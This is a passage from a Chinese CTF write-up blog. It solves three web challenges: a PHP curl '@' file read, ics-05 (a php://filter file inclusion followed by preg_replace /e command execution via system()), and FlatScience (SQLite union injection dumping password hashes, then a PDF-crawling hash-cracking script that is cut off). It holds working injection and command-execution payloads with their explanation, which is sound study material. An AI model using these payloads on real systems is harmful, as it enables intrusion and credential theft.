<p>根据师傅们的文章得知，原题目在比赛中是有提示的（ <code>RTFM of PHP CURL===&gt;&gt;read the fuck manul of PHP CURL???</code> ），所以此处需要利用PHP curl中的@来读取文件，查找PHP手册得到了一些信息：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/class.curlfile.php">https://www.php.net/manual/zh/class.curlfile.php</a></p>
<blockquote>
<p>There are “@” issue on multipart POST requests.</p>
<p>Solution for PHP 5.5 or later:</p>
<ul>
<li>Enable CURLOPT_SAFE_UPLOAD.</li>
<li>Use CURLFile instead of “@”.</li>
</ul>
<p>Solution for PHP 5.4 or earlier:</p>
<ul>
<li>Build up multipart content body by youself.</li>
<li>Change “Content-Type” header by yourself.</li>
</ul>
</blockquote>
<p>手册总的大致意思是在php5.5之后就废弃了POST请求中<code>@+文件路径</code>的上传文件方法。在外网找到了一个相关使用示例：</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604387427.png" alt="1604209282439(1).png"></p>
<p>利用此前的页面报错得到的Django项目路径，以及在报错页面搜索得到的database.sqlite3数据库文件，尝试读取该数据库文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@/opt/api/database.sqlite3</span><br></pre></td></tr></table></figure>

<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604387435.png" alt="1604214520408 (1).png"></p>
<p>页面搜索CTF，得到Flag：<code>AWHCTF&#123;yoooo_Such_A_G00D_@&#125;</code></p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>解释一下为什么此处能够读取到文件，正常程序POST请求和FILE请求是分开的，但是题目中将FILE请求和POST请求合并到了一块：</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604387447.png" alt="1604216002158.png"></p>
<p>同时又将<strong>CONTENT_TYPE</strong>设定为奇怪的<code>multipart/form-data</code></p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604387456.png" alt="1604216203986.png"></p>
<p>而PHP的curl中@上传文件正好是在需要 <code>multipart/form-data</code> 所以猜测后台的<strong>程序逻辑</strong>是：</p>
<ul>
<li>PHP接收GET参数，使用POST方式传递给后台Django搭建的api</li>
<li>Django对PHP传进来的POST数据做GBK编码</li>
<li>GBK编码后再执行Django中的ping操作</li>
</ul>
<p>所以能够利用并<strong>读取文件的原理</strong>是：</p>
<ul>
<li>利用PHP的curl @读取文件后，POST传递给Django做编码处理</li>
<li>Django中GBK编码无法对POST传递的文件内容中超过%7F的字符做编解码处理就会报错，比如<code>\xe6</code></li>
<li>Django开启了debug，所以会将POST数据作为报错输出到页面</li>
</ul>
<p>也是参考师傅们学习的，路子太野了~</p>
<h3 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="http://www.wupco.cn/?p=4195">http://www.wupco.cn/?p=4195</a></p>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.curl-setopt.php">https://www.php.net/manual/zh/function.curl-setopt.php</a></p>
<p><a target="_blank" rel="noopener" href="https://www.dazhuanlan.com/2019/12/30/5e0957fc025dc/">https://www.dazhuanlan.com/2019/12/30/5e0957fc025dc/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/class.curlfile.php">https://www.php.net/manual/zh/class.curlfile.php</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Jleixin/p/13024972.html">https://www.cnblogs.com/Jleixin/p/13024972.html</a></p>
<p><a target="_blank" rel="noopener" href="http://code.iamkate.com/php/sending-files-using-curl/">http://code.iamkate.com/php/sending-files-using-curl/</a></p>
<h2 id="⭐-ics-05（文件包含-php-x2F-x2F-filter本地读取-preg-replace-命令执行）"><a href="#⭐-ics-05（文件包含-php-x2F-x2F-filter本地读取-preg-replace-命令执行）" class="headerlink" title="⭐ ics-05（文件包含+php:&#x2F;&#x2F;filter本地读取+preg_replace()命令执行）"></a>⭐ ics-05（文件包含+php:&#x2F;&#x2F;filter本地读取+preg_replace()命令执行）</h2><p>题目描述： 其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统，所以直接进习通的维护中心板块，但是发现页面是接口请求异常</p>
<p>点击做上边的标题，发现url中page参数包含了index页面，考虑是否存在文件包含漏洞</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604393476.png" alt="1604245119902 (1).png"></p>
<p>将page参数改为<code>/etc/passwd</code>成功包含，的确存在，但是尝试其他文件又没有反应，而且当输入的是字符串时，会直接输出该字符串，不太理解……</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604393505.png" alt="1604245312186 (1).png"></p>
<p>FUZZ跑一下特殊字符，发现所有字符都会被过滤，唯独<code>#</code>不会过滤，且会作为截断符号</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604393520.png" alt="1604245457548(1).png"></p>
<p>所以考虑能不能SQL注入，但是尝试了很久都没有结果，实在没办法，看了师傅们的wp得知，此处需要<strong>利用文件包含，通过php伪协议<code>php://filter</code>来读取文件</strong>。</p>
<p>OK，既然知道了利用手段，开始学习呗。</p>
<p>官方解释<code>php://filter</code>是 一种原封装器，设计用于数据流打开时的筛选过滤应用。，其实就是对数据流进行过滤，以当前题目的payload来实例分析：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>

<p>这里边：</p>
<ul>
<li><strong>php:</strong> 代表一种php协议；</li>
<li>**php:&#x2F;&#x2F;filter&#x2F; **表示用于访问本地文件；</li>
<li><strong>read&#x3D;convert.base64-encode</strong> 代表读取的是base64编码后的结果；</li>
<li>**&#x2F;resource&#x3D;index.php **表示要读取的目标文件是index.php。</li>
</ul>
<p>当然还可以写文件，具体见以下链接及官方手册：</p>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.php.php"><strong>https://www.php.net/manual/zh/wrappers.php.php</strong></a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/linuxsec/articles/12684259.html"><strong>https://www.cnblogs.com/linuxsec/articles/12684259.html</strong></a></p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604393571.png" alt="1604246054845 (1).png"></p>
<p>所以payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>

<p>读取index.php的base64编码后的内容，并输出在页面</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604393584.png" alt="1604246697723 (1).png"></p>
<p>base64解码后，得到index.php的源码，主要的部分有以下3个片段</p>
<p><strong>1</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$page</span> = <span class="variable">$_GET</span>[page];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ctype_alnum</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">    &lt;div style=<span class="string">&quot;text-align:center&quot;</span>&gt;</span><br><span class="line">        &lt;p <span class="class"><span class="keyword">class</span>=&quot;<span class="title">lead</span>&quot;&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">page</span>; <span class="title">die</span>();?&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">br</span> /&gt;&lt;<span class="title">br</span> /&gt;&lt;<span class="title">br</span> /&gt;&lt;<span class="title">br</span> /&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">&#125;<span class="title">else</span></span>&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这段主要在第9行，解释了为什么会返回字符串</p>
<p><strong>2</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$page</span>, <span class="string">&#x27;input&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$page</span>, <span class="string">&#x27;ta:text&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$page</span>, <span class="string">&#x27;text&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$page</span> === <span class="string">&#x27;index.php&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Ok&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这段对包含的文件名做了过滤，并对包含index.php的返回值做了重写，所以无法包含直接得到index.php源码，然后如果没有被甄别到的话，机会执行14行的包含文件操作，没有其他的安全校验了</p>
<p><strong>3</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] === <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pattern</span> = <span class="variable">$_GET</span>[pat];</span><br><span class="line">    <span class="variable">$replacement</span> = <span class="variable">$_GET</span>[rep];</span><br><span class="line">    <span class="variable">$subject</span> = <span class="variable">$_GET</span>[sub];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$pattern</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$replacement</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$subject</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$pattern</span>, <span class="variable">$replacement</span>, <span class="variable">$subject</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这一段是最关键的，源码显示，如果<code>X_FORWARDED_FOR</code>是127.0.0.1的话，就会触发下面的代码逻辑，接受3个参数进行<code>preg_replace()</code>函数的正则替换，但是并没有对这三个参数做安全校验。</p>
<p>在之前的漏洞复现 <a target="_blank" rel="noopener" href="https://www.yyxzz.net/articles/59.html"><strong>CVE-2016-5734 - phpmyadmin远程代码执行</strong></a> 中学习到，<code>preg_replace()</code>函数当正则表达式的模式是<code>/e</code>时，会进行命令执行，具体可看之前的漏洞复现文章中的分析。所以我们只需要将<code>X_FORWARDED_FOR</code>设定为127.0.0.1，然后构造payload执行命令读取flag即可。</p>
<p>使用ModHeader插件添加请求头，访问index.php页面即可触发内部测试页面</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604393603.png" alt="1604247980550 (1).png"></p>
<p>构造如下payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?pat=/(.)/e&amp;rep=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat s3chahahaDir/flag/flag.php&#x27;</span>)&amp;sub=aaa</span><br></pre></td></tr></table></figure>

<p>flag的路径是不断<code>ls -l</code>出来的，发送即可包含该文件得到Flag</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604393621.png" alt="1604248139499.png"></p>
<h3 id="参考-2"><a href="#参考-2" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.php.php">https://www.php.net/manual/zh/wrappers.php.php</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/linuxsec/articles/12684259.html">https://www.cnblogs.com/linuxsec/articles/12684259.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/destiny1507/article/details/82347371">https://blog.csdn.net/destiny1507/article/details/82347371</a></p>
<h2 id="⭐-FlatScience（SQLite回显注入-python脚本密码碰撞）"><a href="#⭐-FlatScience（SQLite回显注入-python脚本密码碰撞）" class="headerlink" title="⭐ FlatScience（SQLite回显注入+python脚本密码碰撞）"></a>⭐ FlatScience（SQLite回显注入+python脚本密码碰撞）</h2><p>题目来源：Hack.lu-2017</p>
<p>页面是一些链接，点进去全是pdf文件，有多层目录嵌套，没有发现可疑点</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604395488.png" alt="1604305384872.png"></p>
<p>Dirb扫描发现了robots.txt文件，得到两个路径：login.php和admin.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /login.php</span><br><span class="line">Disallow: /admin.php</span><br></pre></td></tr></table></figure>

<p>admin.php提示需要admin账户登录，尝试SQL注入和登录绕过都失败了，原码处注释<code>&lt;!-- do not even try to bypass this --&gt;</code>，看来行不通，暂时放下</p>
<p>在login.php中的usr参数发现了SQL注入漏洞，使用单引号制造报错，得到数据库类型SQLite以及网站根目录<code>/var/www/html</code></p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604395499.png" alt="1604305624026.png"></p>
<p>而且在本页面的源码处也发现了注释提示：<code>&lt;!-- TODO: Remove ?debug-Parameter! --&gt;</code>，意思是要**?debug<strong>吗，url后输入</strong>?debug**果然页面给出了login.php源码，截取部分关键的php代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;usr&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pw&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;usr&#x27;</span>];</span><br><span class="line">        <span class="variable">$pass</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pw&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">SQLite3</span>(<span class="string">&#x27;../fancy.db&#x27;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;SELECT id,name from Users where name=&#x27;&quot;</span>.<span class="variable">$user</span>.<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>.<span class="title function_ invoke__">sha1</span>(<span class="variable">$pass</span>.<span class="string">&quot;Salz!&quot;</span>).<span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetchArray</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;Some Error occourred!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">            <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27; &#x27;</span>.<span class="variable">$row</span>[<span class="string">&#x27;name&#x27;</span>], <span class="title function_ invoke__">time</span>() + <span class="number">60</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /&quot;</span>);</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;debug&#x27;</span>]))</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;login.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>审计结果：</strong></p>
<ul>
<li>第8行的SQL查询语句的确存在注入，有name和password字段，存储的password为拼接并做SHA1的结果</li>
<li>存在id参数，利用查询结果生成Cookie，此处会产生回显</li>
<li>GET传参debug时，会输出login.php源码</li>
</ul>
<p>所以思路就比较明确了，利用SQL注入，查询admin账户的密码然后破解或碰撞。</p>
<p><strong>注入过程：</strong></p>
<p>根据审计结果，测试是否会有注入回显，当查询到结果时，就会设定Cookie，以存在的admin用户为例</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604395530.png" alt="1604306380187.png"></p>
<p>通过是否有Set-Cookie字段，进行order by和union select联合查询，得到回显点是在查询结果的第2个字段</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604395538.png" alt="1604306542142.png"></p>
<p>SQLite数据库中，存在一个sqlite_master默认表，类似于mysql中的information_schema，可以在sqlite_master中查询所有的表明以及之前执行过的创建表的sql语句，具体：</p>
<blockquote>
<p><strong>sqlite_master</strong> 表是 SQLite 的系统表。该表记录该数据库中保存的表、索引、视图、和触发器信息。每一行记录一个项目。在创建一个 SQLIite 数据库的时候，该表会自动创建。sqlite_master 表<strong>包含5列</strong>。</p>
<p><strong>type</strong>：记录了项目的类型，如 table、index、view、trigger 。</p>
<p><strong>name</strong>：记录了项目的名称，如表名、索引名等。</p>
<p><strong>tbl_name</strong>：记录所从属的表名，如索引所在的表名。对于表来说，该列就是表名本身。</p>
<p><strong>rootpage</strong>：记录项目在数据库页中存储的编号。对于视图和触发器，该列值为0或者 NULL 。</p>
<p><strong>sql</strong>：记录创建该项目的 SQL 语句。</p>
</blockquote>
<p>所以可构造的SQL语句如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> tbl_name <span class="keyword">from</span> sqlite_master <span class="comment">-- 查询表名</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">sql</span> <span class="keyword">from</span> sqlite_master <span class="comment">-- 查询执行过的sql语句</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">sql</span> <span class="keyword">from</span> sqlite_master <span class="keyword">where</span> type<span class="operator">=</span><span class="string">&#x27;table&#x27;</span> <span class="keyword">and</span> tbl_name<span class="operator">=</span><span class="string">&#x27;Users&#x27;</span> <span class="comment">-- 查询创建User表的SQL语句</span></span><br></pre></td></tr></table></figure>

<p>这样的话，就可以利用limit子句，逐个查询表名，再通过查询创建该表的sql语句得到其字段信息，已经查到了存在Users表，查询其字段信息：</p>
<p>payload：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?usr<span class="operator">=</span><span class="string">&#x27;union select 1,sql from sqlite_master where type=&#x27;</span><span class="keyword">table</span><span class="string">&#x27; and tbl_name=&#x27;</span>Users<span class="string">&#x27; --+&amp;pw=aa&amp;id=1</span></span><br></pre></td></tr></table></figure>

<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604395559.png" alt="1604307079546.png"></p>
<p>得到4个字段：id、name、password、hint</p>
<p>利用聚合函数<code>group_concat()</code>分别查询name、password和hint</p>
<p>payload：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?usr=&#x27; union select 1,group_concat(name,&quot;----&quot;) from Users --+&amp;pw=aa&amp;id=1</span><br><span class="line">?usr=&#x27; union select 1,group_concat(password,&quot;----&quot;) from Users --+&amp;pw=aa&amp;id=1</span><br><span class="line">?usr=&#x27; union select 1,group_concat(hint,&quot;----&quot;) from Users --+&amp;pw=aa&amp;id=1</span><br></pre></td></tr></table></figure>

<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604395567.png" alt="1604307326795.png"></p>
<p>统计查到的数据：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">name:  admin</span><br><span class="line">password:  34b0bb7c304949f9ff2fc101eef0f048be10d3bd</span><br><span class="line">hint:  my+fav+word+in+my+fav+paper%3F%21</span><br><span class="line"></span><br><span class="line">fritze</span><br><span class="line">3fab54a50e770d830c0416df817567662a9dc85c</span><br><span class="line">my+love+is%E2%80%A6%3F</span><br><span class="line"></span><br><span class="line">hansi</span><br><span class="line">54eae8935c90f467427f05e4ece82cf569f89507</span><br><span class="line">the+password+is+password</span><br></pre></td></tr></table></figure>

<p>因为密码的散列值是加盐的，所以网上破解不出来，写了一个Python脚本对常用的2万个密码同样加盐做SHA1散列进行碰撞，没有得到结果。</p>
<p>hint提示密码就在那些pdf中，对<code>%E2%80%A6%3F</code>做URL解码后逐个pdf查询也没有得到结果。懵了，没办法，看一下师傅们的wp吧，得知需要爬取所有PDF，对其中的单词进行加盐SHA1做碰撞测试。</p>
<p>OK，自己撸代码吧，不用师傅们写好的了，毕竟也是学了一段时间Python的，而且之前给女盆友写英文PDF翻译工具时已经有一些轮子了，直接拿来用吧（小声bb：给小黑同学的翻译工具到现在还没写好，没有找到合适的翻译api）</p>
<p>大概花了1个半个小时写完。。。太慢了😓</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3.7</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : Cr4y0n</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="comment"># @Time    : 2020/11/2 17:26</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfparser <span class="keyword">import</span> PDFParser</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfdocument <span class="keyword">import</span> PDFDocument</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfpage <span class="keyword">import</span> PDFPage</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfpage <span class="keyword">import</span> PDFTextExtractionNotAllowed</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfinterp <span class="keyword">import</span> PDFResourceManager</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfinterp <span class="keyword">import</span> PDFPageInterpreter</span><br><span class="line"><span class="keyword">from</span> pdfminer.layout <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pdfminer.converter <span class="keyword">import</span> PDFPageAggregator</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在页面递归查找pdf文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findPDF</span>(<span class="params">url</span>):</span><br><span class="line">    re_pdf = <span class="string">&quot;[a-fA-F0-9]&#123;32&#125;.pdf&quot;</span></span><br><span class="line">    re_index = <span class="string">&quot;[0-9\/]&#123;1,5&#125;index.html&quot;</span></span><br><span class="line">    <span class="keyword">global</span> pdfList</span><br><span class="line">    rep = requests.get(url).text</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> re.findall(re_pdf, rep):</span><br><span class="line">        pdfURL = url + i</span><br><span class="line">        pdfUrlList.append(pdfURL)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;PDF：&quot;</span>, pdfURL)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> re.findall(re_index, rep):</span><br><span class="line">        newURL = url + i[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">        findPDF(newURL)</span><br><span class="line"><span 